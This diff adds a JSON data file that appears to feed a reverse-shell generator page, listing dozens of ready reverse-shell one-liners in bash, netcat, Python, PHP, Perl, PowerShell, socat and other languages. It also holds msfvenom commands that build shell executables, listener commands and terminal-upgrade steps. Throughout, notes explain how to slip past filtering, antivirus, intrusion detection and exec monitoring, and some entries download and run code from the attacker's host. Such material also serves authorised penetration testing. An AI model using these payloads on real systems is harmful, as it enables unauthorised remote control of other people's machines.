@@ -1,0 +1,527 @@
+{
+  "version": 1,
+  "updated": "2026-10-11",
+  "note": "Payloads are the standard published forms, written out here rather than copied from any one site. Nothing on this page runs: the browser does string substitution and hands you text.",
+  "shells": [
+    "/bin/sh",
+    "/bin/bash",
+    "/bin/zsh",
+    "/bin/dash",
+    "/bin/ash",
+    "/bin/ksh",
+    "/bin/busybox sh",
+    "cmd.exe",
+    "powershell.exe"
+  ],
+  "encodings": [
+    {
+      "id": "none",
+      "name": "None",
+      "help": "The payload as-is."
+    },
+    {
+      "id": "url",
+      "name": "URL encode",
+      "help": "For a payload going into a query string or form field."
+    },
+    {
+      "id": "double",
+      "name": "Double URL encode",
+      "help": "For a payload that passes through two decoders — a proxy and then the app."
+    },
+    {
+      "id": "b64",
+      "name": "Base64 (sh)",
+      "help": "Wrapped so the target decodes and runs it. Survives quote and space mangling."
+    }
+  ],
+  "groups": [
+    {
+      "id": "bash",
+      "name": "Bash",
+      "intro": "Bash can open a TCP socket on its own through /dev/tcp, so these need nothing installed. The catch is that /dev/tcp is a bash and ksh feature, not a POSIX one — on a box where /bin/sh is dash they fail silently.",
+      "payloads": [
+        {
+          "id": "bash-i",
+          "name": "Bash -i",
+          "platform": "linux",
+          "text": "{shell} -i >& /dev/tcp/{ip}/{port} 0>&1",
+          "note": "The one everybody reaches for first. Interactive shell, both streams redirected onto the socket."
+        },
+        {
+          "id": "bash-196",
+          "name": "Bash 196",
+          "platform": "linux",
+          "text": "0<&196;exec 196<>/dev/tcp/{ip}/{port}; {shell} <&196 >&196 2>&196",
+          "note": "Uses an explicit high file descriptor instead of >&. Works in places where the first one is filtered."
+        },
+        {
+          "id": "bash-readline",
+          "name": "Bash read line",
+          "platform": "linux",
+          "text": "exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done",
+          "note": "No interactive shell at all: it reads a line, runs it, writes the output back. Survives environments that kill -i."
+        },
+        {
+          "id": "bash-udp",
+          "name": "Bash UDP",
+          "platform": "linux",
+          "text": "{shell} -i >& /dev/udp/{ip}/{port} 0>&1",
+          "note": "Same trick over UDP. Pair it with a UDP listener (nc -u -lvnp).",
+          "warn": "UDP has no connection, so you get no confirmation it worked."
+        },
+        {
+          "id": "bash-5",
+          "name": "Bash 5",
+          "platform": "linux",
+          "text": "{shell} -i 5<> /dev/tcp/{ip}/{port} 0<&5 1>&5 2>&5",
+          "note": "Opens fd 5 read-write and points all three standard streams at it."
+        }
+      ]
+    },
+    {
+      "id": "nc",
+      "name": "Netcat",
+      "intro": "Netcat comes in incompatible flavours. The -e flag is a compile-time option that most distributions now ship disabled, which is why the mkfifo version exists.",
+      "payloads": [
+        {
+          "id": "nc-e",
+          "name": "nc -e",
+          "platform": "linux",
+          "text": "nc {ip} {port} -e {shell}",
+          "note": "Only works on builds compiled with GAPING_SECURITY_HOLE. Try it first; fall back to mkfifo."
+        },
+        {
+          "id": "nc-mkfifo",
+          "name": "nc mkfifo",
+          "platform": "linux",
+          "text": "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|nc {ip} {port} >/tmp/f",
+          "note": "The portable one. A named pipe loops the shell's output back into netcat's input, which is what -e would have done."
+        },
+        {
+          "id": "nc-c",
+          "name": "nc -c",
+          "platform": "linux",
+          "text": "nc -c {shell} {ip} {port}",
+          "note": "The BSD and OpenBSD spelling of -e."
+        },
+        {
+          "id": "busybox-nc",
+          "name": "BusyBox nc",
+          "platform": "linux",
+          "text": "busybox nc {ip} {port} -e {shell}",
+          "note": "BusyBox is on nearly every embedded box and most minimal containers, and its nc keeps -e."
+        },
+        {
+          "id": "ncat-e",
+          "name": "ncat -e",
+          "platform": "linux",
+          "text": "ncat {ip} {port} -e {shell}",
+          "note": "Nmap's rewrite of netcat. Always has -e, and is often present wherever nmap is."
+        },
+        {
+          "id": "ncat-udp",
+          "name": "ncat UDP",
+          "platform": "linux",
+          "text": "ncat --udp {ip} {port} -e {shell}",
+          "note": "Worth trying when outbound TCP is filtered but DNS-style UDP is not."
+        },
+        {
+          "id": "nc-exe",
+          "name": "nc.exe -e",
+          "platform": "windows",
+          "text": "nc.exe {ip} {port} -e cmd.exe",
+          "note": "You have to get nc.exe onto the host first. Flagged by every AV in existence."
+        }
+      ]
+    },
+    {
+      "id": "python",
+      "name": "Python",
+      "intro": "Present on nearly every Linux host. The pty version gives you a real terminal immediately, which saves the upgrade dance later.",
+      "payloads": [
+        {
+          "id": "python3-pty",
+          "name": "Python 3 (pty)",
+          "platform": "linux",
+          "text": "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"{ip}\",{port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"{shell}\")'",
+          "note": "The best Linux payload on this page. pty.spawn gives you job control and a working Ctrl-C with no upgrade needed."
+        },
+        {
+          "id": "python3-subprocess",
+          "name": "Python 3 (subprocess)",
+          "platform": "linux",
+          "text": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"{shell}\",\"-i\"])'",
+          "note": "No pty, so no tab completion, but it avoids the pty module on stripped-down builds."
+        },
+        {
+          "id": "python3-env",
+          "name": "Python 3 (env vars)",
+          "platform": "linux",
+          "text": "export RHOST=\"{ip}\";export RPORT={port};python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"{shell}\")'",
+          "note": "Keeps the address out of the python string. Useful when quoting is being mangled by whatever is injecting it."
+        },
+        {
+          "id": "python-windows",
+          "name": "Python (Windows)",
+          "platform": "windows",
+          "text": "python.exe -c 'import socket,subprocess,os,threading;s=socket.socket();s.connect((\"{ip}\",{port}));p=subprocess.Popen([\"cmd.exe\"],stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.STDOUT);threading.Thread(target=lambda:[s.send(p.stdout.read(1)) for _ in iter(int,1)],daemon=True).start();[p.stdin.write(s.recv(1024)) or p.stdin.flush() for _ in iter(int,1)]'",
+          "note": "No dup2 on Windows sockets, so it pumps bytes between the socket and cmd.exe by hand."
+        }
+      ]
+    },
+    {
+      "id": "php",
+      "name": "PHP",
+      "intro": "Six spellings of the same idea, because which exec-family function is disabled varies by host. If one returns nothing, try the next.",
+      "payloads": [
+        {
+          "id": "php-exec",
+          "name": "PHP exec",
+          "platform": "linux",
+          "text": "php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"{shell} -i <&3 >&3 2>&3\");'",
+          "note": "fsockopen lands on file descriptor 3, which is why every one of these redirects from <&3."
+        },
+        {
+          "id": "php-shell-exec",
+          "name": "PHP shell_exec",
+          "platform": "linux",
+          "text": "php -r '$sock=fsockopen(\"{ip}\",{port});shell_exec(\"{shell} -i <&3 >&3 2>&3\");'"
+        },
+        {
+          "id": "php-system",
+          "name": "PHP system",
+          "platform": "linux",
+          "text": "php -r '$sock=fsockopen(\"{ip}\",{port});system(\"{shell} -i <&3 >&3 2>&3\");'"
+        },
+        {
+          "id": "php-passthru",
+          "name": "PHP passthru",
+          "platform": "linux",
+          "text": "php -r '$sock=fsockopen(\"{ip}\",{port});passthru(\"{shell} -i <&3 >&3 2>&3\");'"
+        },
+        {
+          "id": "php-popen",
+          "name": "PHP popen",
+          "platform": "linux",
+          "text": "php -r '$sock=fsockopen(\"{ip}\",{port});popen(\"{shell} -i <&3 >&3 2>&3\",\"r\");'"
+        },
+        {
+          "id": "php-proc-open",
+          "name": "PHP proc_open",
+          "platform": "linux",
+          "text": "php -r '$s=fsockopen(\"{ip}\",{port});$p=array(0=>$s,1=>$s,2=>$s);$proc=proc_open(\"{shell} -i\",$p,$pipes);'",
+          "note": "The one to try when the whole exec family is in disable_functions. proc_open is often missed."
+        }
+      ]
+    },
+    {
+      "id": "perl",
+      "name": "Perl",
+      "intro": "Still installed by default on most server distributions, and rarely monitored.",
+      "payloads": [
+        {
+          "id": "perl",
+          "name": "Perl",
+          "platform": "linux",
+          "text": "perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"{shell} -i\");};'"
+        },
+        {
+          "id": "perl-no-sh",
+          "name": "Perl without sh",
+          "platform": "linux",
+          "text": "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"{ip}:{port}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'",
+          "note": "Never spawns a shell binary, so it slips past controls that watch for sh or bash being executed."
+        },
+        {
+          "id": "perl-windows",
+          "name": "Perl (Windows)",
+          "platform": "windows",
+          "text": "perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,\"{ip}:{port}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'",
+          "note": "Same, minus the fork, which Windows Perl does not do well."
+        }
+      ]
+    },
+    {
+      "id": "powershell",
+      "name": "PowerShell",
+      "intro": "The Windows default. Note that -nop and -w hidden do nothing against AMSI or Defender on a modern host; assume these get caught unless you have already dealt with that.",
+      "payloads": [
+        {
+          "id": "powershell-tcp",
+          "name": "PowerShell TCP",
+          "platform": "windows",
+          "text": "powershell -nop -w hidden -c \"$c=New-Object System.Net.Sockets.TCPClient('{ip}',{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sby=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sby,0,$sby.Length);$s.Flush()};$c.Close()\"",
+          "note": "The standard one-liner. Reads from the socket, runs it through iex, writes the output back with a prompt."
+        },
+        {
+          "id": "powershell-iex",
+          "name": "PowerShell download cradle",
+          "platform": "windows",
+          "text": "powershell -nop -c \"IEX(New-Object Net.WebClient).DownloadString('http://{ip}/shell.ps1')\"",
+          "note": "Pulls the real payload from your host instead of putting it on the command line. Keeps the long script out of logs.",
+          "warn": "You have to be serving shell.ps1 — python3 -m http.server 80 on your box."
+        },
+        {
+          "id": "powershell-base64",
+          "name": "PowerShell encoded",
+          "platform": "windows",
+          "text": "powershell -nop -w hidden -e {b64ps}",
+          "note": "The TCP payload above, UTF-16LE then base64, which is what -e expects. Survives quote mangling.",
+          "warn": "Picked up by anything watching for -e or -EncodedCommand."
+        }
+      ]
+    },
+    {
+      "id": "socat",
+      "name": "socat",
+      "intro": "The only payload here that gives you a fully interactive TTY on the first connection, with no upgrade step.",
+      "payloads": [
+        {
+          "id": "socat-sh",
+          "name": "socat",
+          "platform": "linux",
+          "text": "socat TCP:{ip}:{port} EXEC:{shell}"
+        },
+        {
+          "id": "socat-tty",
+          "name": "socat TTY",
+          "platform": "linux",
+          "text": "socat TCP:{ip}:{port} EXEC:'{shell} -li',pty,stderr,setsid,sigint,sane",
+          "note": "Full TTY: arrow keys, tab completion, Ctrl-C that kills the remote process rather than your listener. Needs the socat listener, not nc."
+        },
+        {
+          "id": "socat-static",
+          "name": "socat (static binary)",
+          "platform": "linux",
+          "text": "wget -q http://{ip}/socat -O /tmp/socat && chmod +x /tmp/socat && /tmp/socat TCP:{ip}:{port} EXEC:'{shell} -li',pty,stderr,setsid,sigint,sane",
+          "note": "When socat is not installed. Push a static build from your box first."
+        }
+      ]
+    },
+    {
+      "id": "other",
+      "name": "Other languages",
+      "intro": "When the usual suspects are missing, one of these usually is not.",
+      "payloads": [
+        {
+          "id": "ruby",
+          "name": "Ruby",
+          "platform": "linux",
+          "text": "ruby -rsocket -e'spawn(\"{shell}\",[:in,:out,:err]=>TCPSocket.new(\"{ip}\",{port}))'"
+        },
+        {
+          "id": "nodejs",
+          "name": "Node.js",
+          "platform": "linux",
+          "text": "node -e 'const c=require(\"net\").connect({port},\"{ip}\",()=>{const s=require(\"child_process\").spawn(\"{shell}\",[]);c.pipe(s.stdin);s.stdout.pipe(c);s.stderr.pipe(c);});'"
+        },
+        {
+          "id": "golang",
+          "name": "Golang",
+          "platform": "linux",
+          "text": "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"{ip}:{port}\");cmd:=exec.Command(\"{shell}\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go",
+          "note": "Writes and compiles on the box, so it needs the Go toolchain present and a writable /tmp."
+        },
+        {
+          "id": "awk",
+          "name": "awk",
+          "platform": "linux",
+          "text": "awk 'BEGIN {s = \"/inet/tcp/0/{ip}/{port}\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null",
+          "note": "Needs gawk specifically — mawk and busybox awk have no /inet support."
+        },
+        {
+          "id": "lua",
+          "name": "Lua",
+          "platform": "linux",
+          "text": "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{ip}','{port}');os.execute('{shell} -i <&3 >&3 2>&3');\"",
+          "note": "Turns up on embedded devices and inside nginx/OpenResty and Redis."
+        },
+        {
+          "id": "telnet",
+          "name": "Telnet",
+          "platform": "linux",
+          "text": "TF=$(mktemp -u);mkfifo $TF && telnet {ip} {port} 0<$TF | {shell} 1>$TF",
+          "note": "Same named-pipe trick as nc mkfifo, for a box that has telnet but no netcat."
+        },
+        {
+          "id": "zsh",
+          "name": "zsh",
+          "platform": "linux",
+          "text": "zsh -c 'zmodload zsh/net/tcp && ztcp {ip} {port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'",
+          "note": "zsh has its own TCP module, so like bash it needs nothing installed."
+        },
+        {
+          "id": "openssl",
+          "name": "OpenSSL (encrypted)",
+          "platform": "linux",
+          "text": "mkfifo /tmp/s; {shell} -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {ip}:{port} > /tmp/s; rm /tmp/s",
+          "note": "The only payload here that is not plaintext on the wire. Needs the OpenSSL listener and a certificate — the listener tab has both commands."
+        }
+      ]
+    },
+    {
+      "id": "msfvenom",
+      "name": "msfvenom",
+      "intro": "For when you want a file rather than a one-liner, or a Meterpreter session rather than a shell. Catch these with the multi/handler listener, not nc.",
+      "payloads": [
+        {
+          "id": "msf-linux-elf",
+          "name": "Linux ELF",
+          "platform": "linux",
+          "text": "msfvenom -p linux/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f elf -o shell.elf"
+        },
+        {
+          "id": "msf-windows-exe",
+          "name": "Windows EXE",
+          "platform": "windows",
+          "text": "msfvenom -p windows/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f exe -o shell.exe"
+        },
+        {
+          "id": "msf-meterpreter",
+          "name": "Windows Meterpreter",
+          "platform": "windows",
+          "text": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f exe -o met.exe",
+          "note": "Meterpreter, not a plain shell. Needs exploit/multi/handler with the matching payload set."
+        },
+        {
+          "id": "msf-php",
+          "name": "PHP",
+          "platform": "any",
+          "text": "msfvenom -p php/reverse_php LHOST={ip} LPORT={port} -f raw -o shell.php",
+          "note": "Prepend <?php and append ?> — msfvenom does not."
+        },
+        {
+          "id": "msf-war",
+          "name": "JSP / WAR",
+          "platform": "any",
+          "text": "msfvenom -p java/jsp_shell_reverse_tcp LHOST={ip} LPORT={port} -f war -o shell.war",
+          "note": "For Tomcat manager uploads."
+        },
+        {
+          "id": "msf-aspx",
+          "name": "ASPX",
+          "platform": "windows",
+          "text": "msfvenom -p windows/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f aspx -o shell.aspx"
+        },
+        {
+          "id": "msf-python",
+          "name": "Python",
+          "platform": "any",
+          "text": "msfvenom -p cmd/unix/reverse_python LHOST={ip} LPORT={port} -f raw"
+        }
+      ]
+    }
+  ],
+  "listeners": [
+    {
+      "id": "nc-listen",
+      "name": "netcat",
+      "platform": "linux",
+      "text": "nc -lvnp {port}",
+      "note": "The default. -l listen, -v tell me what happened, -n no DNS lookups, -p port."
+    },
+    {
+      "id": "ncat-listen",
+      "name": "ncat",
+      "platform": "linux",
+      "text": "ncat -lvnp {port}",
+      "note": "Nmap's netcat. Same flags, better behaved on disconnect."
+    },
+    {
+      "id": "ncat-ssl",
+      "name": "ncat with TLS",
+      "platform": "linux",
+      "text": "ncat --ssl -lvnp {port}",
+      "note": "Pairs with an ncat --ssl payload. Encrypts the session so an IDS sees TLS, not a shell."
+    },
+    {
+      "id": "rlwrap",
+      "name": "rlwrap + nc",
+      "platform": "linux",
+      "text": "rlwrap -cAr nc -lvnp {port}",
+      "note": "Wraps netcat in readline, so you get arrow keys and history in a raw shell without upgrading it."
+    },
+    {
+      "id": "pwncat",
+      "name": "pwncat-cs",
+      "platform": "linux",
+      "text": "pwncat-cs -lp {port}",
+      "note": "Upgrades the shell to a full TTY by itself, and gives you file upload and download over the same session."
+    },
+    {
+      "id": "rustcat",
+      "name": "rustcat",
+      "platform": "linux",
+      "text": "rcat listen {port}",
+      "note": "Automatic TTY upgrade and command history, single static binary."
+    },
+    {
+      "id": "socat-listen",
+      "name": "socat TTY listener",
+      "platform": "linux",
+      "text": "socat -d -d file:`tty`,raw,echo=0 TCP-L:{port}",
+      "note": "The listener side of the socat TTY payload. Must be this, not nc, or the pty negotiation does nothing."
+    },
+    {
+      "id": "openssl-listen",
+      "name": "OpenSSL listener",
+      "platform": "linux",
+      "text": "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes -subj '/CN=localhost' && openssl s_server -quiet -key key.pem -cert cert.pem -port {port}",
+      "note": "Generates a self-signed certificate, then listens with it. The payload side is the OpenSSL entry under Other languages."
+    },
+    {
+      "id": "msf-handler",
+      "name": "Metasploit handler",
+      "platform": "linux",
+      "text": "msfconsole -q -x \"use exploit/multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST {ip}; set LPORT {port}; set ExitOnSession false; exploit -j\"",
+      "note": "Required for any msfvenom payload. The payload string here must match the one you generated."
+    },
+    {
+      "id": "udp-listen",
+      "name": "UDP listener",
+      "platform": "linux",
+      "text": "nc -u -lvnp {port}",
+      "note": "For the Bash UDP and ncat UDP payloads."
+    }
+  ],
+  "upgrade": [
+    {
+      "name": "1. Spawn a PTY",
+      "cmds": [
+        "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
+        "python -c 'import pty; pty.spawn(\"/bin/bash\")'",
+        "script -qc /bin/bash /dev/null",
+        "perl -e 'exec \"/bin/bash\";'"
+      ],
+      "why": "A raw shell has no controlling terminal, so sudo, ssh, su and most text editors refuse to run. Any one of these gives you one. Try them in order; script is there for boxes with no Python."
+    },
+    {
+      "name": "2. Background and fix the local terminal",
+      "cmds": [
+        "# press Ctrl-Z to background the shell, then on YOUR machine:",
+        "stty raw -echo; fg",
+        "# press Enter twice"
+      ],
+      "why": "stty raw -echo stops your own terminal from intercepting Ctrl-C and echoing what you type, and hands both through to the remote shell instead. fg brings the session back."
+    },
+    {
+      "name": "3. Set the terminal type and size",
+      "cmds": [
+        "export TERM=xterm-256color",
+        "export SHELL=/bin/bash",
+        "# read the numbers from `stty size` in YOUR terminal, then:",
+        "stty rows 50 cols 200"
+      ],
+      "why": "Without TERM, clear, less, vim and nano all fail. Without the right size, anything full-screen draws over itself."
+    },
+    {
+      "name": "Alternative: skip all of it",
+      "cmds": [
+        "socat TCP:{ip}:{port} EXEC:'/bin/bash -li',pty,stderr,setsid,sigint,sane",
+        "# listener: socat -d -d file:`tty`,raw,echo=0 TCP-L:{port}"
+      ],
+      "why": "The socat TTY payload negotiates a pty on connection, so you land in a full terminal with nothing to fix. Use it whenever socat is on the target."
+    }
+  ]
+}
